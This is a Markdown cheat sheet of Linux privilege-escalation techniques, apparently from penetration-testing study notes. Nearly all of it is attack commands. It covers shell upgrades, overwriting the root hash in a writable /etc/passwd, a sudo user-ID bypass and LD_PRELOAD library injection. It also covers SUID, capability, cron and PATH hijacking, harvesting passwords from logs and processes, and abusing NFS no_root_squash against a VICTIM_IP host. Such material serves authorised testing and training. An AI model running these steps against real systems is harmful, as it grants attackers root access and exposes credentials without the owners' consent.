## 03a. Linux Privilege Escalation
### Resources
- [Hacktricks Checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
- [GTFOBins](https://gtfobins.github.io/)
- [Compiled Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

### Upgrade your shell if it's not fully interactive
- `SHELL=/bin/bash script -q /dev/null`
- `python -c 'import pty;pty.spawn("/bin/bash")'`
- `python -c 'import pty;pty.spawn("/bin/sh")'`
- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- `python3 -c 'import pty;pty.spawn("/bin/sh")'`
- ^Z and `stty raw -echo && fg`

### Checklist

- **SYSTEM - get system context**
	- `whoami` `id` `hostname`
- **Check for users && writable /etc/passwd**
	- `ls -la /etc/passwd` `cat /etc/passwd`
   		- `openssl passwd -1 -salt hacker hacker` and replace `root` password entry (or delete `x`)
		- `su root` `hacker` 
 	- check for passwords and info from user on /var/logs using `grep iR username`
- **KERNEL - Get kernel version** 
	- `uname -a` or `cat /proc/version` or `cat /etc/issue`
 	- search the result with `searchsploit`
  	- check on [CVE Details](https://www.cvedetails.com/)
  	- automated suggestions with [LES (Linux Exploit Suggester)](https://github.com/The-Z-Labs/linux-exploit-suggester)
  	- [Compiled Kernel Exploits](https://github.com/lucyoa/kernel-exploits)
	- `~/exploits` and Privilege Escalation notes
- **Check for sudo (valid password)** 
	- `sudo -l` `sudo -V` (below 1.28 `sudo -u#-1 /bin/bash`)
 	- if `env_keep+=LD_PRELOAD` exists we can load a custom lib (check repo files)
  		- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
    	- `sudo LD_PRELOAD=/home/user/ldpreload/shell.so command`
- **Check for SUID Binaries**
	- `find / -perm -u=s -type f 2>/dev/null`
	- `find / -perm -04000 2>/dev/null`
 	- check binaries in [GTFOBins](https://gtfobins.github.io/)
- **Check capabilities**
	- `getcap -r / 2>/dev/null` look for cap_setuid+ep
- **Check cronjobs**
	- `ls -lah /etc/cron*` `cat /var/log/syslog | grep cron` `cat /var/log/cron.log`
	- `grep "CRON" /var/log/syslog` `ls -la /etc/cron.d` `ls -la /etc/cron.hourly`
 	- if the crontab script don't have a explicit path, it will execute from the directory present in crontab's `PATH=` var
- **Check environment**
	- `echo $PATH` `(env || set) 2>/dev/null` `history` `cat ~/.bashrc`
 	- check if you can write at $PATH
  	- copy binaries as bash or cat to new dir with new name
  	- create C script that calls the new bin, compile and `chmod u+s script`
  	- exec script from terminal
- **Check processes**
	- `ps aux` `ps -ef` `watch -n 1 "ps -aux | grep pass"`
- **Check your writable/usable files & file permissions**
	- `find / -writable -type d 2>/dev/null`
	- `find / -perm -u=s -type f 2>/dev/null`
	- `ls -la`
- **Check networking & services running on localhost**
	- `ip a` `netstat` `ss -anp`
- **Check NFS permissions**
	- `cat /etc/exports` if host use file sharing. Shared directory need `no_root_squash` param
 	- on attacker host
  		- `showmount -e VICTIM_IP`
		- `mkdir /tmp/dir`
  		- `mount -o rw VICTIM_IP:/dir_no_squash /tmp/dir`
    	- code c file (check repo)
    	- `gcc file.c -o file -w` this step may need to compile using older libs if victim host request. Use docker.
     	- `chmod +s file` and copy to /tmp/dir
	- on victim host exec the file from shared dir 
